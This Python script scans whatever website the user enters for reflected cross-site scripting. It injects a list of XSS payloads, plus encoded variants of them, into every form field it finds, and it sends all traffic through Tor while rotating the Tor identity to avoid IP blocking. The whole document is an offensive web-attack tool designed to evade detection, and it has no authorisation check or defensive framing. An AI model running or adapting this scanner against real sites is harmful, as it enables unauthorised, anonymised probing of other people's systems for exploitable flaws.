import requests
import re
import threading
import random
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from stem.control import Controller
from stem import Signal

# Tor Proxy Setup
TOR_PROXY = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

def change_tor_ip():
    """Changes the Tor identity to prevent IP blocking."""
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="your_password")
        controller.signal(Signal.NEWNYM)
        time.sleep(3)

def get_forms(url, session):
    """Extracts all forms from a given URL."""
    response = session.get(url, proxies=TOR_PROXY)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find_all("form")

def generate_payloads():
    """Generates a list of XSS payloads with different encoding techniques."""
    base_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\" onmouseover=alert('XSS') "
    ]
    mutations = [lambda p: p.replace("<", "%3C").replace(">", "%3E"),
                 lambda p: p.replace("'", "&#39;"),
                 lambda p: p.replace("\"", "&quot;")]
    
    return base_payloads + [mutate(p) for p in base_payloads for mutate in mutations]

def test_xss(url, form, session, payloads):
    """Tests XSS by injecting payloads into form fields."""
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    
    target_url = urljoin(url, action)
    for payload in payloads:
        data = {i.get("name", "test"): payload for i in inputs}
        
        if method == "post":
            response = session.post(target_url, data=data, proxies=TOR_PROXY)
        else:
            response = session.get(target_url, params=data, proxies=TOR_PROXY)
        
        if payload in response.text:
            print(f"[🔥] XSS Found! {target_url} with payload: {payload}")
            return True
    return False

def scan_website(url):
    """Main function to scan a website for XSS vulnerabilities."""
    session = requests.Session()
    forms = get_forms(url, session)
    payloads = generate_payloads()
    
    print(f"[🚀] Found {len(forms)} form(s) on {url}")
    for form in forms:
        if test_xss(url, form, session, payloads):
            print("[✅] Site is vulnerable!")
            return
    print("[❌] No XSS found.")

def main():
    url = input("Enter target URL: ")
    threads = []
    for _ in range(3):
        t = threading.Thread(target=scan_website, args=(url,))
        threads.append(t)
        t.start()
        change_tor_ip()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
